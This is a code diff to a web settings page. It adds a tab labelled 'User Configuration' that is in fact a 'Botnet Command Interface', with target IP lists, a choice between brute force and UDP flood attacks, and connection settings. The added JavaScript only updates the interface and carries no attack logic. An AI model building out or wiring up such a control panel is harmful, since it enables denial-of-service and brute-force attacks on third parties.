@@ -21,7 +21,7 @@
   }
   
   body {
-    background-color: var(--dark-bg);
+    /* background-color: var(--dark-bg); */
     font-family: 'Segoe UI', 'Roboto', 'Helvetica Neue', sans-serif;
     color: var(--text-light);
   }
@@ -306,6 +306,84 @@
     color: var(--text-light);
   }
   
+  /* User Configuration Section Styles */
+  .command-section {
+    margin-bottom: 20px;
+    border: 1px solid var(--border-color);
+    border-radius: 6px;
+    overflow: hidden;
+  }
+  
+  .section-header {
+    background-color: var(--medium-bg);
+    padding: 15px 20px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    cursor: pointer;
+    transition: background-color 0.3s;
+  }
+  
+  .section-header:hover {
+    background-color: rgba(255, 255, 255, 0.05);
+  }
+  
+  .section-title {
+    font-weight: 600;
+    font-size: 1.1rem;
+  }
+  
+  .toggle-btn {
+    background: none;
+    border: none;
+    color: var(--text-light);
+    font-size: 1.2rem;
+    cursor: pointer;
+    transition: transform 0.3s;
+  }
+  
+  .toggle-btn.rotate {
+    transform: rotate(45deg);
+  }
+  
+  .section-content {
+    padding: 20px;
+    background-color: var(--dark-bg);
+    display: none;
+  }
+  
+  .section-content.active {
+    display: block;
+  }
+  
+  .target-item {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 10px;
+    background-color: var(--light-bg);
+    margin-bottom: 5px;
+    border-radius: 4px;
+  }
+  
+  .remove-btn {
+    background-color: var(--danger-color);
+    color: white;
+    border: none;
+    padding: 5px 10px;
+    border-radius: 4px;
+    cursor: pointer;
+  }
+  
+  .add-btn {
+    background-color: var(--success-color);
+    color: white;
+    border: none;
+    padding: 5px 15px;
+    border-radius: 4px;
+    cursor: pointer;
+  }
+  
   /* Responsive Design */
   @media (max-width: 768px) {
     .tab-wrapper {
@@ -401,9 +479,9 @@
   }
   
   /* Sidebar and Navbar Dark Theme */
-  .sidebar {
+  /* .sidebar {
     background-color: var(--medium-bg);
-  }
+  } */
   
   .sidebar .nav-item .nav-link {
     color: var(--text-muted);
@@ -427,10 +505,10 @@
     color: var(--text-light) !important;
   }
   
-  .navbar {
+  /* .navbar {
     background-color: var(--medium-bg) !important;
     border-bottom: 1px solid var(--border-color);
-  }
+  } */
   
   .page-header h2, .page-header p {
     color: var(--text-light);
@@ -521,6 +599,10 @@
         <button class="nav-style tablinks" onclick="openTab(event, 'Delay')" aria-selected="false" aria-controls="Delay">
           <i class="fas fa-hourglass-half" aria-hidden="true"></i>
           <span class="tooltip-text">Delay Settings</span>
+        </button>
+        <button class="nav-style tablinks" onclick="openTab(event, 'Instructions')" aria-selected="false" aria-controls="Instructions">
+          <i class="fas fa-list" aria-hidden="true"></i>
+          <span class="tooltip-text">User Configuration</span>
         </button>
         <button class="nav-style tablinks" onclick="openTab(event, 'Delete')" aria-selected="false" aria-controls="Delete">
           <i class="fas fa-trash-alt" aria-hidden="true"></i>
@@ -666,6 +748,90 @@
           </form>
         </div>
 
+        <!-- User Configuration Section -->
+        <div id="Instructions" class="tabcontent" style="display: none;" role="tabpanel" aria-labelledby="Instructions">
+          <h3>Botnet Command Interface</h3>
+          
+          <div class="command-section">
+            <div class="section-header" onclick="toggleSection('targets')">
+                <div class="section-title">Set Command</div>
+                <button class="toggle-btn">+</button>
+            </div>
+            <div id="targets" class="section-content">
+                <div class="form-group">
+                    <label for="target-dropdown">Select Target:</label>
+                    <select id="target-dropdown" class="form-control">
+                        <option value="">-- Select a target --</option>
+                        <option value="target1">Target 1 (192.168.1.10)</option>
+                        <option value="target2">Target 2 (192.168.1.15)</option>
+                        <option value="target3">Target 3 (192.168.1.20)</option>
+                        <option value="target4">Target 4 (192.168.1.25)</option>
+                    </select>
+                </div>
+                
+                <div class="form-group">
+                    <label for="new-target">Add New Target:</label>
+                    <div style="display: flex;">
+                        <input type="text" id="new-target" class="form-control" placeholder="Enter target IP or hostname">
+                        <button class="btn btn-outline add-btn" onclick="addTarget()" style="margin-left: 10px;">+</button>
+                    </div>
+                </div>
+                
+                <div class="target-list" id="target-list">
+                    <!-- Target items will be added here dynamically -->
+                </div>
+            </div>
+          </div>
+          
+          <div class="command-section">
+            <div class="section-header" onclick="toggleSection('instructions')">
+                <div class="section-title">Set Bot Instructions</div>
+                <button class="toggle-btn">+</button>
+            </div>
+            <div id="instructions" class="section-content">
+                <div class="form-group">
+                    <label for="attack-type">Attack Type:</label>
+                    <select id="attack-type" class="form-control">
+                        <option value="">-- Select attack type --</option>
+                        <option value="bruteForce">Brute Force</option>
+                        <option value="udp-flood">UDP Flood</option>
+                    </select>
+                </div>
+                
+                <div class="form-group">
+                    <label for="host-input">Target Host:</label>
+                    <input type="text" id="host-input" class="form-control" placeholder="Enter target host IP or domain">
+                </div>
+                
+                <button class="btn btn-primary" onclick="setInstructions()">Set Instructions</button>
+            </div>
+          </div>
+          
+          <div class="command-section">
+            <div class="section-header" onclick="toggleSection('connection')">
+                <div class="section-title">Set Connection</div>
+                <button class="toggle-btn">+</button>
+            </div>
+            <div id="connection" class="section-content">
+                <div class="form-group">
+                    <label for="connection-type">Connection Type:</label>
+                    <select id="connection-type" class="form-control" onchange="toggleSocketInput()">
+                        <option value="">-- Select connection type --</option>
+                        <option value="socket">Socket</option>
+                        <option value="web">Web</option>
+                    </select>
+                </div>
+                
+                <div class="form-group" id="socket-input-container" style="display: none;">
+                    <label for="socket-input">Socket Details:</label>
+                    <input type="text" id="socket-input" class="form-control" placeholder="Enter socket details (e.g., IP:Port)">
+                </div>
+                
+                <button class="btn btn-primary" onclick="setConnection()">Set Connection</button>
+            </div>
+          </div>
+        </div>
+
         <!-- Delete Account Section -->
         <div id="Delete" class="tabcontent" style="display: none;" role="tabpanel" aria-labelledby="Delete">
           <h3>Delete Account</h3>
@@ -737,95 +903,192 @@
 {% block script %}
 <!-- Custom JS -->
 <script>
+  // Toggle section visibility
+  function toggleSection(sectionId) {
+    const section = document.getElementById(sectionId);
+    const toggleBtn = section.parentElement.querySelector('.toggle-btn');
+    
+    if (section.classList.contains('active')) {
+      section.classList.remove('active');
+      toggleBtn.classList.remove('rotate');
+    } else {
+      section.classList.add('active');
+      toggleBtn.classList.add('rotate');
+    }
+  }
+  
+  // Add new target to the list
+  function addTarget() {
+    const newTargetInput = document.getElementById('new-target');
+    const targetList = document.getElementById('target-list');
+    
+    if (newTargetInput.value.trim() !== '') {
+      const targetItem = document.createElement('div');
+      targetItem.className = 'target-item';
+      targetItem.innerHTML = `
+        <span>${newTargetInput.value}</span>
+        <button class="remove-btn" onclick="removeTarget(this)">Remove</button>
+      `;
+      
+      targetList.appendChild(targetItem);
+      newTargetInput.value = '';
+    }
+  }
+  
+  // Remove target from the list
+  function removeTarget(button) {
+    const targetItem = button.parentElement;
+    targetItem.remove();
+  }
+  
+  // Toggle socket input based on connection type
+  function toggleSocketInput() {
+    const connectionType = document.getElementById('connection-type').value;
+    const socketInputContainer = document.getElementById('socket-input-container');
+    
+    if (connectionType === 'socket') {
+      socketInputContainer.style.display = 'block';
+    } else {
+      socketInputContainer.style.display = 'none';
+    }
+  }
+  
+  // Set bot instructions
+  function setInstructions() {
+    const attackType = document.getElementById('attack-type').value;
+    const host = document.getElementById('host-input').value;
+    
+    if (attackType && host) {
+      showToast(`Instructions set:\nAttack Type: ${attackType}\nTarget Host: ${host}`, "success");
+    } else {
+      showToast('Please select an attack type and enter a target host.', "error");
+    }
+  }
+  
+  // Set connection
+  function setConnection() {
+    const connectionType = document.getElementById('connection-type').value;
+    const socketInput = document.getElementById('socket-input').value;
+    
+    if (connectionType) {
+      if (connectionType === 'socket' && !socketInput) {
+        showToast('Please enter socket details for socket connection.', "error");
+        return;
+      }
+      
+      showToast(`Connection set:\nType: ${connectionType}\n${connectionType === 'socket' ? 'Socket: ' + socketInput : ''}`, "success");
+    } else {
+      showToast('Please select a connection type.', "error");
+    }
+  }
+  
+  // Initialize the page
+  document.addEventListener('DOMContentLoaded', function() {
+    // Add some example targets
+    const exampleTargets = ['192.168.1.30', 'example.com', '10.0.0.5'];
+    const targetList = document.getElementById('target-list');
+    
+    exampleTargets.forEach(target => {
+      const targetItem = document.createElement('div');
+      targetItem.className = 'target-item';
+      targetItem.innerHTML = `
+        <span>${target}</span>
+        <button class="remove-btn" onclick="removeTarget(this)">Remove</button>
+      `;
+      
+      targetList.appendChild(targetItem);
+    });
+  });
+
   // api_token genrate and delete
   // API token generate/delete and DOM update
   async function apiToken(endpoint, method, tokenId = null) {
-  try {
-    const response = await fetch(endpoint, { method });
-    if (!response.ok) throw new Error('Failed to fetch API token');
+    try {
+      const response = await fetch(endpoint, { method });
+      if (!response.ok) throw new Error('Failed to fetch API token');
 
-    const data = await response.json();
-    console.log(data.message);
+      const data = await response.json();
+      console.log(data.message);
 
-    // Handle generate response
-    if (data.api_token && data.id) {
-      createTokenRow(data);
-      showToast("New token generated", "success");
+      // Handle generate response
+      if (data.api_token && data.id) {
+        createTokenRow(data);
+        showToast("New token generated", "success");
+      }
+
+    } catch (error) {
+      console.error("Error fetching API token:", error);
+      showToast("API request failed", "error");
     }
-
-  } catch (error) {
-    console.error("Error fetching API token:", error);
-    showToast("API request failed", "error");
   }
-}
 
-function createTokenRow(data) {
-  const tbody = document.querySelector("#tokenTableBody");
-  const newRow = document.createElement("tr");
-  newRow.id = `tokenRow${data.id}`;
-  
-  newRow.innerHTML = `
-    <td>
-      <div class="input-group">
-        <input style="color:#121212;" type="password" 
-               id="tokenField${data.id}" 
-               class="form-control tokenValue" 
-               value="${escapeHtml(data.api_token)}" readonly>
-        <div class="input-group-append">
-          <button class="btn btn-outline" type="button" 
-                  onclick="toggleToken('${data.id}')">
-            <i class="fas fa-eye" id="toggleIcon${data.id}"></i>
+  function createTokenRow(data) {
+    const tbody = document.querySelector("#tokenTableBody");
+    const newRow = document.createElement("tr");
+    newRow.id = `tokenRow${data.id}`;
+    
+    newRow.innerHTML = `
+      <td>
+        <div class="input-group">
+          <input style="color:#121212;" type="password" 
+                id="tokenField${data.id}" 
+                class="form-control tokenValue" 
+                value="${escapeHtml(data.api_token)}" readonly>
+          <div class="input-group-append">
+            <button class="btn btn-outline" type="button" 
+                    onclick="toggleToken('${data.id}')">
+              <i class="fas fa-eye" id="toggleIcon${data.id}"></i>
+            </button>
+          </div>
+        </div>
+      </td>
+      <td>
+        <div class="btn-group">
+          <button type="button" class="btn btn-outline" 
+                  onclick="copyToken('${data.id}')">
+            <i class="fas fa-copy"></i> Copy
+          </button>
+          <button type="button" class="btn btn-outline" 
+                  onclick="apiTokenDelete(this, '${data.id}', '/apiToken/delete')">
+            <i class="fas fa-trash"></i> Delete
           </button>
         </div>
-      </div>
-    </td>
-    <td>
-      <div class="btn-group">
-        <button type="button" class="btn btn-outline" 
-                onclick="copyToken('${data.id}')">
-          <i class="fas fa-copy"></i> Copy
-        </button>
-        <button type="button" class="btn btn-outline" 
-                onclick="apiTokenDelete(this, '${data.id}', '/apiToken/delete')">
-          <i class="fas fa-trash"></i> Delete
-        </button>
-      </div>
-    </td>`;
-  
-  tbody.appendChild(newRow);
-}
-
-async function apiTokenDelete(btnEl, tokenId, endPoint) {
-  try {
-    const response = await fetch(`${endPoint}/${tokenId}`, { 
-      method: 'DELETE' 
-    });
+      </td>`;
     
-    const data = await response.json().catch(() => ({}));
-    
-    if (!response.ok && !data.message?.toLowerCase().includes('deleted')) {
-      throw new Error(data.error || 'Delete failed');
-    }
-    
-    // Remove the exact row that contains the clicked button
-    btnEl.closest('tr')?.remove();
-    showToast('Token deleted successfully', 'success');
-    
-  } catch (error) {
-    console.error('Delete error:', error);
-    showToast(error.message || 'Failed to delete token', 'error');
+    tbody.appendChild(newRow);
   }
-}
 
-// Utility function to prevent XSS
-function escapeHtml(unsafe) {
-  return unsafe
-    ?.replace(/&/g, "&amp;")
-    ?.replace(/</g, "&lt;")
-    ?.replace(/>/g, "&gt;")
-    ?.replace(/"/g, "&quot;")
-    ?.replace(/'/g, "&#039;") || '';
-}
+  async function apiTokenDelete(btnEl, tokenId, endPoint) {
+    try {
+      const response = await fetch(`${endPoint}/${tokenId}`, { 
+        method: 'DELETE' 
+      });
+      
+      const data = await response.json().catch(() => ({}));
+      
+      if (!response.ok && !data.message?.toLowerCase().includes('deleted')) {
+        throw new Error(data.error || 'Delete failed');
+      }
+      
+      // Remove the exact row that contains the clicked button
+      btnEl.closest('tr')?.remove();
+      showToast('Token deleted successfully', 'success');
+      
+    } catch (error) {
+      console.error('Delete error:', error);
+      showToast(error.message || 'Failed to delete token', 'error');
+    }
+  }
+
+  // Utility function to prevent XSS
+  function escapeHtml(unsafe) {
+    return unsafe
+      ?.replace(/&/g, "&amp;")
+      ?.replace(/</g, "&lt;")
+      ?.replace(/>/g, "&gt;")
+      ?.replace(/"/g, "&quot;")
+      ?.replace(/'/g, "&#039;") || '';
+  }
 
   // Tab functionality
   function openTab(evt, tabName) {
